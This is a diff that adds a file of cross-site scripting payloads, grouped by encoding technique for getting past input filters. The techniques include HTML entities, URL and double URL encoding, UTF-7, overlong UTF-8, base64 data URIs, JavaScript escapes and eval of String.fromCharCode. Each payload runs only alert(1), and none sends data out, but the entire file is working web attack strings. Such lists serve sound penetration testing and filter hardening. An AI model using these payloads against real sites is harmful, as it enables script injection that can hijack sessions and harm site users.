@@ -1,0 +1,90 @@
+# Encoding Bypass Payloads
+# XSS payloads using various encoding techniques to bypass filters
+# These target input validation that doesn't properly decode input
+
+# HTML entity encoding (decimal)
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;
+
+# HTML entity encoding (hexadecimal)
+&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;alert(1)&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x78;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;
+
+# Mixed HTML entities
+<&#115;cript>alert(1)</script>
+<sc&#114;ipt>alert(1)</script>
+<scr&#105;pt>alert(1)</script>
+<&#x73;cript>alert(1)</script>
+
+# Unicode encoding
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003ealert(1)\u003c/script\u003e
+\u003cimg src=x onerror=alert(1)\u003e
+
+# URL encoding variations
+%3Cscript%3Ealert(1)%3C/script%3E
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Cimg%2520src=x%2520onerror=alert(1)%253E
+
+# UTF-7 encoding
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++ADw-img src=x onerror=alert(1)+AD4-
+
+# UTF-8 overlong encoding
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+
+# Base64 in data URI
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# JavaScript Unicode escape
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>\x61\x6c\x65\x72\x74(1)</script>
+
+# Octal encoding in JavaScript
+<script>\141\154\145\162\164(1)</script>
+
+# Mixed encoding techniques
+<&#x73;cr\u0069pt>alert(1)</script>
+<scr%69pt>alert(1)</script>
+%3C%73%63%72%69%70%74%3E\u0061lert(1)%3C/script%3E
+
+# Hex encoding in attributes
+<img src=x on\x65rror=alert(1)>
+<img src=x onerror=\x61lert(1)>
+
+# Entity encoding in event handlers
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+
+# Double encoding combinations
+&#x26;lt;script&#x26;gt;alert(1)&#x26;lt;/script&#x26;gt;
+
+# Percent encoding with variations
+<img src=x one%72ror=alert(1)>
+<scr%69pt>alert(1)</scr%69pt>
+
+# Backslash encoding
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=ale\u0072t(1)>
+
+# Case variation with encoding
+<%53cript>alert(1)</%53cript>
+<im%47 src=x onerror=alert(1)>
+
+# UTF-16 encoding
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+# Mixed case and encoding
+<ScR%69pT>alert(1)</sCr%69Pt>
+
+# Null byte encoding attempts
+<script\x00>alert(1)</script>
+<img\x00src=x onerror=alert(1)>
